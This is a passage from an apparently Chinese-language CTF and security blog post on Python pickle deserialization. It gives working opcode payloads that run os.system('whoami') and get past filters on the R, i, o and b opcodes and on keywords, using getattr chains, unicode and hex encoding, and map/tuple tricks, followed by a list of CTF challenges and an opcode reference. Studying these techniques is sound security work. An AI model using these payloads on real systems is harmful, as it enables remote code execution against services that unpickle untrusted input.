class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(opcode)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;\x80\x03cbuiltins\ngetattr\nq\x00cbuiltins\ndict\nq\x01X\x03\x00\x00\x00getq\x02\x86q\x03Rq\x04.&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-comment"># 其中q\0xn可以去掉</span><br></code></pre></td></tr></table></figure><p>然后获取<code>pickle.loads</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br> <br>opcode=<span class="hljs-string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntR.&quot;</span><br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><span class="hljs-string">&#x27;&lt;built-in function loads&gt;&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>最后使用v3版本的字节码<code>C</code>修饰恶意opcode，再执行<code>pickle.loads</code>即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 二次加载的opcode：C\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.</span><br><span class="hljs-comment">#与上文获取到的pickle.loads()结合好后就是</span><br>opcode=<span class="hljs-string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span><br></code></pre></td></tr></table></figure><h3 id="绕过R指令"><a href="#绕过R指令" class="headerlink" title="绕过R指令"></a>绕过R指令</h3><h4 id="i指令"><a href="#i指令" class="headerlink" title="i指令"></a>i指令</h4><p>i操作符对应的函数原型如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_inst</span>(<span class="hljs-params">self</span>):<br>       module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>       name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>       klass = self.find_class(module, name)<br>       self._instantiate(klass, self.pop_mark())<br></code></pre></td></tr></table></figure><p>向下读取两行作为<code>module</code>与<code>name</code>，然后<code>find_class()</code>返回函数模块，最后弹栈<code>pop_mark()</code>获取MARK，使用<code>_instantiate</code>执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;(X\x06\x00\x00\x00whoamiios\nsystem\n.&#x27;</span><br><span class="hljs-comment"># (与i对应，i操作符寻找上一个MARK并闭合。</span><br><span class="hljs-comment"># X向后读取四个字符串并压入栈。</span><br><span class="hljs-comment"># i继续向后读取</span><br></code></pre></td></tr></table></figure><h4 id="o指令"><a href="#o指令" class="headerlink" title="o指令"></a>o指令</h4><p>o操作符对应的函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_obj</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># Stack is ... markobject classobject arg1 arg2 ...</span><br>    args = self.pop_mark()<br>    cls = args.pop(<span class="hljs-number">0</span>)<br>    self._instantiate(cls, args)<br></code></pre></td></tr></table></figure><p>先弹出栈中一个元素作为<code>args</code>，也就是参数，而后再弹出第一个元素作为函数，调用<code>_instantiate</code>函数自执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;(cos\nsystem\nX\x06\x00\x00\x00whoamio.&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="b指令"><a href="#b指令" class="headerlink" title="b指令"></a>b指令</h4><p>b操作符对应的函数如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>       stack = self.stack<br>       state = stack.pop()<br>       inst = stack[-<span class="hljs-number">1</span>]<br>       setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br>       <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>           setstate(state)<br>           <span class="hljs-keyword">return</span><br>    <span class="hljs-comment">#.....</span><br></code></pre></td></tr></table></figure><p>首先弹栈获取为<code>state</code>，然后获取栈中的<code>__setstate__</code>，当栈中存在<code>__setstate__</code>时，执行<code>setstate(state)</code>。因此自定义一个<code>__setstate__</code>类，分别构造<code>os.system</code>和<code>whoami</code>即可执行命令。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tttang</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>            self.name=<span class="hljs-string">&quot;quan9i&quot;</span><br>opcode=<span class="hljs-string">b&#x27;c__main__\ntttang\n)\x81&#125;X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.&#x27;</span><br>b=pickle.loads(opcode)<br><span class="hljs-comment">#解读</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">字符c，往后读取两行，得到主函数和类，__main__.tttang</span><br><span class="hljs-string">字符)，向栈中压入空元祖()</span><br><span class="hljs-string">字符&#125;，向栈中压入空字典&#123;&#125;</span><br><span class="hljs-string">字符X，读取四位\x0C\x00\x00\x00__setstate__,得到__setstate__</span><br><span class="hljs-string">字符c，向后读取两行，得到函数os.system</span><br><span class="hljs-string">字符s，将第一个和第二个元素作为键值对，添加到第三个元素中，此时也就是&#123;__main.tttang:()&#125;，__setstate__,os.system</span><br><span class="hljs-string">字符b，第一个元素出栈，此时也就是&#123;&#x27;__setstate__&#x27;: os.system&#125;,此时执行一次setstate(state)</span><br><span class="hljs-string">字符X，往后读取四位x06\x00\x00\x00whoami，即whoami</span><br><span class="hljs-string">字符b，弹出元素whoami此时state为whoami，执行os.system(whoami)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><h4 id="V指令"><a href="#V指令" class="headerlink" title="V指令"></a>V指令</h4><p>V操作符可以实例化一个unicode对象，因此我们可以对关键字进行unicode编码进行绕过。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#修改前</span><br>opcode = <span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;tttang&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#修改后，绕过对于字符串&#x27;key&#x27;的检测</span><br>opcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(V\u006bey </span><br><span class="hljs-string">S&#x27;tttang&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>S操作符可以识别十六进制，同样可以用于绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;\x6bey&#x27;</span><br><span class="hljs-string">S&#x27;tttang&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="获取内置函数"><a href="#获取内置函数" class="headerlink" title="获取内置函数"></a>获取内置函数</h4><p>对于已导入的模块，我们可以通过<code>sys.modules[&#39;xxx&#39;]</code>来获取该模块，然后通过<a href="https://docs.python.org/zh-cn/3.7/library/functions.html">内置函数</a>dir()来列出模块中的所有属性</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;admin&#x27;</span>]))<br> <br><span class="hljs-comment">#[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;secret&#x27;]</span><br></code></pre></td></tr></table></figure><p>由于pickle不支持索引，所以使用<code>reverse()</code>以及<code>next()</code>实现对属性的遍历，就可以避免关键字的出现，最后结合变量覆盖即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">(((((c__main__</span><br><span class="hljs-string">admin</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next  #在这里获取到secret</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">db(S&#x27;admin&#x27;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">i__main__</span><br><span class="hljs-string">User</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="内置函数执行"><a href="#内置函数执行" class="headerlink" title="内置函数执行"></a>内置函数执行</h3><p>当R、i、o、b都被过滤时，要想实现代码执行就要考虑借助python内置函数，也就是对象迭代器：<a href="https://docs.python.org/zh-cn/3/library/functions.html#map">map()</a>、<a href="https://docs.python.org/zh-cn/3/library/functions.html#filter">filter()</a>。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">map</span>(function， iterable， *iterables)<br><span class="hljs-built_in">filter</span>(function, iterable)<br></code></pre></td></tr></table></figure><p>其实与CC1中的<code>Transformer</code>数组有点像，前一函数的返回值作为后一函数的参数传入，实现链式函数执行。CC1中需要执行<code>ChainedTransformer(obj).transform()</code>才能触发执行，这里使用map或filter也一样，需要执行<code>__next_()</code>才能触发执行，在python中称之为懒惰机制。</p><p>但是事实上执行<code>map(eval, [&#39;print(\&#39;1\&#39;)&#39;]).__next__()</code>后也无法触发执行，原因是</p><blockquote><p>FROM <code>__next__()</code></p><p>如果已经没有可返回的项，则会引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#StopIteration"><code>StopIteration</code></a> 异常。 此方法对应于 Python&#x2F;C API 中 Python 对象类型结构体的 <a href="https://docs.python.org/zh-cn/3/c-api/typeobj.html#c.PyTypeObject.tp_iternext"><code>tp_iternext</code></a> 槽位。</p><p>FROM <code>tp_iternext</code>：</p><p>​This function has the same signature as <a href="https://docs.python.org/zh-cn/3/c-api/iter.html#c.PyIter_Next"><code>PyIter_Next()</code></a>.</p><p>FROM <code>PyIter_Next()</code>：</p><p>从迭代器 <em>o</em> 返回下一个值。 对象必须可被 <a href="https://docs.python.org/zh-cn/3/c-api/iter.html#c.PyIter_Check"><code>PyIter_Check()</code></a> 确认为迭代器（需要调用方来负责检查）。 如果没有剩余的值，则返回 <code>NULL</code> 并且不设置异常。 如果在获取条目时发生了错误，则返回 <code>NULL</code> 并且传递异常。</p></blockquote><p>因此想办法触发<code>PyIter_Next</code>即可，可以借用<code>tuple</code>或<code>bytes</code>进行触发：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">bytes</span>.__new__(<span class="hljs-built_in">bytes</span>, <span class="hljs-built_in">map</span>.__new__(<span class="hljs-built_in">map</span>, <span class="hljs-built_in">eval</span>, [<span class="hljs-string">&#x27;print(1)&#x27;</span>]))  <span class="hljs-comment"># bytes_new-&gt;PyBytes_FromObject-&gt;_PyBytes_FromIterator-&gt;PyIter_Next</span><br><span class="hljs-built_in">tuple</span>.__new__(<span class="hljs-built_in">tuple</span>, <span class="hljs-built_in">map</span>.__new__(<span class="hljs-built_in">map</span>, <span class="hljs-built_in">exec</span>, [<span class="hljs-string">&quot;print(&#x27;1&#x27;)&quot;</span>]))  <span class="hljs-comment"># tuple_new_impl-&gt;PySequence_Tuple-&gt;PyIter_Next</span><br></code></pre></td></tr></table></figure><p>其中<code>__new__</code>方法，也就是类构造方法可由操作码<code>\x81</code>触发，最后得到opcode就是;</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode_tuple=<span class="hljs-string">b&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string">map</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tp1</span><br><span class="hljs-string">0(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81p3</span><br><span class="hljs-string">0c__builtin__</span><br><span class="hljs-string">tuple</span><br><span class="hljs-string">p4</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">t\x81.&#x27;&#x27;&#x27;</span><br><br>opcode_bytes=<span class="hljs-string">b&#x27;&#x27;&#x27;c__builtin__</span><br><span class="hljs-string">map</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tp1</span><br><span class="hljs-string">0(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81p3</span><br><span class="hljs-string">0c__builtin__</span><br><span class="hljs-string">bytes</span><br><span class="hljs-string">p4</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">t\x81.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h3><ul><li>强网杯 2022 crash     <em>变量覆盖</em></li><li>SekaiCTF 2022 Bottle Poem    </li><li>美团CTF 2022 ezpickle        <em>内置函数绕过代码执行</em></li><li>Code-Breaking 2018 picklecode   <em>getattr bypass</em></li><li>[CISCN2019 华北赛区 Day1 Web2]ikun</li></ul><h3 id="opcode速览"><a href="#opcode速览" class="headerlink" title="opcode速览"></a>opcode速览</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python">MARK           = <span class="hljs-string">b&#x27;(&#x27;</span>   <span class="hljs-comment"># push special markobject on stack⭐将值作为MARK压入栈中</span><br>STOP           = <span class="hljs-string">b&#x27;.&#x27;</span>   <span class="hljs-comment"># every pickle ends with STOP⭐结尾符</span><br>POP            = <span class="hljs-string">b&#x27;0&#x27;</span>   <span class="hljs-comment"># discard topmost stack item</span><br>POP_MARK       = <span class="hljs-string">b&#x27;1&#x27;</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span><br>DUP            = <span class="hljs-string">b&#x27;2&#x27;</span>   <span class="hljs-comment"># duplicate top stack item</span><br>FLOAT          = <span class="hljs-string">b&#x27;F&#x27;</span>   <span class="hljs-comment"># push float object; decimal string argument⭐单精度值</span><br>INT            = <span class="hljs-string">b&#x27;I&#x27;</span>   <span class="hljs-comment"># push integer or bool; decimal string argument⭐整型值</span><br>BININT         = <span class="hljs-string">b&#x27;J&#x27;</span>   <span class="hljs-comment"># push four-byte signed int</span><br>BININT1        = <span class="hljs-string">b&#x27;K&#x27;</span>   <span class="hljs-comment"># push 1-byte unsigned int</span><br>LONG           = <span class="hljs-string">b&#x27;L&#x27;</span>   <span class="hljs-comment"># push long; decimal string argument</span><br>BININT2        = <span class="hljs-string">b&#x27;M&#x27;</span>   <span class="hljs-comment"># push 2-byte unsigned int</span><br>NONE           = <span class="hljs-string">b&#x27;N&#x27;</span>   <span class="hljs-comment"># push None⭐空值</span><br>PERSID         = <span class="hljs-string">b&#x27;P&#x27;</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span><br>BINPERSID      = <span class="hljs-string">b&#x27;Q&#x27;</span>   <span class="hljs-comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br>REDUCE         = <span class="hljs-string">b&#x27;R&#x27;</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack⭐抽取MARK组合成tuple，回调。</span><br>STRING         = <span class="hljs-string">b&#x27;S&#x27;</span>   <span class="hljs-comment"># push string; NL-terminated string argument⭐</span><br>BINSTRING      = <span class="hljs-string">b&#x27;T&#x27;</span>   <span class="hljs-comment"># push string; counted binary string argument⭐</span><br>SHORT_BINSTRING= <span class="hljs-string">b&#x27;U&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br>UNICODE        = <span class="hljs-string">b&#x27;V&#x27;</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span><br>BINUNICODE     = <span class="hljs-string">b&#x27;X&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br>APPEND         = <span class="hljs-string">b&#x27;a&#x27;</span>   <span class="hljs-comment"># append stack top to list below it</span><br>BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()⭐更新字典</span><br>GLOBAL         = <span class="hljs-string">b&#x27;c&#x27;</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args⭐将模块压入栈</span><br>DICT           = <span class="hljs-string">b&#x27;d&#x27;</span>   <span class="hljs-comment"># build a dict from stack items⭐</span><br>EMPTY_DICT     = <span class="hljs-string">b&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># push empty dict⭐</span><br>APPENDS        = <span class="hljs-string">b&#x27;e&#x27;</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span><br>GET            = <span class="hljs-string">b&#x27;g&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span><br>BINGET         = <span class="hljs-string">b&#x27;h&#x27;</span>   <span class="hljs-comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br>INST           = <span class="hljs-string">b&#x27;i&#x27;</span>   <span class="hljs-comment"># build &amp;amp; push class instance⭐</span><br>LONG_BINGET    = <span class="hljs-string">b&#x27;j&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span><br>LIST           = <span class="hljs-string">b&#x27;l&#x27;</span>   <span class="hljs-comment"># build list from topmost stack items⭐</span><br>EMPTY_LIST     = <span class="hljs-string">b&#x27;]&#x27;</span>   <span class="hljs-comment"># push empty list⭐</span><br>OBJ            = <span class="hljs-string">b&#x27;o&#x27;</span>   <span class="hljs-comment"># build &amp;amp; push class instance⭐</span><br>PUT            = <span class="hljs-string">b&#x27;p&#x27;</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span><br>BINPUT         = <span class="hljs-string">b&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br>LONG_BINPUT    = <span class="hljs-string">b&#x27;r&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br>SETITEM        = <span class="hljs-string">b&#x27;s&#x27;</span>   <span class="hljs-comment"># add key+value pair to dict</span><br>TUPLE          = <span class="hljs-string">b&#x27;t&#x27;</span>   <span class="hljs-comment"># build tuple from topmost stack items</span><br>EMPTY_TUPLE    = <span class="hljs-string">b&#x27;)&#x27;</span>   <span class="hljs-comment"># push empty tuple⭐</span><br>SETITEMS       = <span class="hljs-string">b&#x27;u&#x27;</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span><br>BINFLOAT       = <span class="hljs-string">b&#x27;G&#x27;</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span><br><br>TRUE           = <span class="hljs-string">b&#x27;I01\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br>FALSE          = <span class="hljs-string">b&#x27;I00\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><br><span class="hljs-comment"># Protocol 2</span><br><br>PROTO          = <span class="hljs-string">b&#x27;\x80&#x27;</span>  <span class="hljs-comment"># identify pickle protocol</span><br>NEWOBJ         = <span class="hljs-string">b&#x27;\x81&#x27;</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span><br>EXT1           = <span class="hljs-string">b&#x27;\x82&#x27;</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span><br>EXT2           = <span class="hljs-string">b&#x27;\x83&#x27;</span>  <span class="hljs-comment"># ditto, but 2-byte index</span><br>EXT4           = <span class="hljs-string">b&#x27;\x84&#x27;</span>  <span class="hljs-comment"># ditto, but 4-byte index</span><br>TUPLE1         = <span class="hljs-string">b&#x27;\x85&#x27;</span>  <span class="hljs-comment"># build 1-tuple from stack top</span><br>TUPLE2         = <span class="hljs-string">b&#x27;\x86&#x27;</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span><br>TUPLE3         = <span class="hljs-string">b&#x27;\x87&#x27;</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span><br>NEWTRUE        = <span class="hljs-string">b&#x27;\x88&#x27;</span>  <span class="hljs-comment"># push True</span><br>NEWFALSE       = <span class="hljs-string">b&#x27;\x89&#x27;</span>  <span class="hljs-comment"># push False</span><br>LONG1          = <span class="hljs-string">b&#x27;\x8a&#x27;</span>  <span class="hljs-comment"># push long from &amp;lt; 256 bytes</span><br>LONG4          = <span class="hljs-string">b&#x27;\x8b&#x27;</span>  <span class="hljs-comment"># push really big long</span><br><br>_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]<br><br><span class="hljs-comment"># Protocol 3 (Python 3.x)</span><br><br>BINBYTES       = <span class="hljs-string">b&#x27;B&#x27;</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span><br>SHORT_BINBYTES = <span class="hljs-string">b&#x27;C&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><br><span class="hljs-comment"># Protocol 4</span><br><br>SHORT_BINUNICODE = <span class="hljs-string">b&#x27;\x8c&#x27;</span>  <span class="hljs-comment"># push short string; UTF-8 length &amp;lt; 256 bytes</span><br>BINUNICODE8      = <span class="hljs-string">b&#x27;\x8d&#x27;</span>  <span class="hljs-comment"># push very long string</span><br>BINBYTES8        = <span class="hljs-string">b&#x27;\x8e&#x27;</span>  <span class="hljs-comment"># push very long bytes string</span><br>EMPTY_SET        = <span class="hljs-string">b&#x27;\x8f&#x27;</span>  <span class="hljs-comment"># push empty set on the stack</span><br>ADDITEMS         = <span class="hljs-string">b&#x27;\x90&#x27;</span>  <span class="hljs-comment"># modify set by adding topmost stack items</span><br>FROZENSET        = <span class="hljs-string">b&#x27;\x91&#x27;</span>  <span class="hljs-comment"># build frozenset from topmost stack items</span><br>NEWOBJ_EX        = <span class="hljs-string">b&#x27;\x92&#x27;</span>  <span class="hljs-comment"># like NEWOBJ but work with keyword only arguments</span><br>STACK_GLOBAL     = <span class="hljs-string">b&#x27;\x93&#x27;</span>  <span class="hljs-comment"># same as GLOBAL but using names on the stacks</span><br>MEMOIZE          = <span class="hljs-string">b&#x27;\x94&#x27;</span>  <span class="hljs-comment"># store top of the stack in memo</span><br>FRAME            = <span class="hljs-string">b&#x27;\x95&#x27;</span>  <span class="hljs-comment"># indicate the beginning of a new frame</span><br><br><span class="hljs-comment"># Protocol 5</span><br><br>BYTEARRAY8       = <span class="hljs-string">b&#x27;\x96&#x27;</span>  <span class="hljs-comment"># push bytearray</span><br>NEXT_BUFFER      = <span 